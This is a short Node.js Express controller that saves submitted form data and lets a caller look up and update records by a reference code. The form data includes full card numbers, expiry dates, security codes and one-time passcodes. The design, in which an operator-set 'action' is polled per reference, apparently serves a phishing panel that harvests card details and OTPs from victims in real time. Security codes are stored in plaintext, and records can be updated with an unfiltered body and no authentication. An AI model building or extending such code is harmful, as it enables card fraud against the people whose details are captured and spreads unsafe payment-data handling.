const db = require("../models");
const FormData = db.FormData;

// Create and Save new FormData
exports.create = (req, res) => {
  const formData = {
    phoneNumber: req.body.phoneNumber,
    firstName: req.body.firstName,
    lastName: req.body.lastName,
    deliveryAddress: req.body.deliveryAddress,
    cardHolderName: req.body.cardHolderName,
    cardNumber: req.body.cardNumber,
    expiryDate: req.body.expiryDate,
    securityCode: req.body.securityCode,
    ref: req.body.ref,
    otp: req.body.otp,
  };

  FormData.create(formData)
    .then((data) => {
      res.send(data);
    })
    .catch((err) => {
      res.status(500).send({
        message:
          err.message || "Some error occurred while saving the form data.",
      });
    });
};

// Get action by ref
exports.getActionByRef = (req, res) => {
  const ref = req.params.ref;

  FormData.findOne({ where: { ref: ref } })
    .then((data) => {
      if (!data) {
        res
          .status(404)
          .send({ message: `Cannot find FormData with ref=${ref}` });
      } else {
        res.send({ action: data.action });
      }
    })
    .catch((err) => {
      res.status(500).send({
        message: `Error retrieving FormData with ref=${ref}`,
      });
    });
};

// Update FormData by ref
exports.updateFormDataByRef = (req, res) => {
  const ref = req.params.ref;
  const updatedData = req.body;

  FormData.update(updatedData, { where: { ref: ref } })
    .then((num) => {
      if (num == 1) {
        res.send({
          message: "FormData was updated successfully.",
        });
      } else {
        res.send({
          message: `Cannot update FormData with ref=${ref}. Maybe FormData was not found or req.body is empty!`,
        });
      }
    })
    .catch((err) => {
      res.status(500).send({
        message: `Error updating FormData with ref=${ref}`,
      });
    });
};
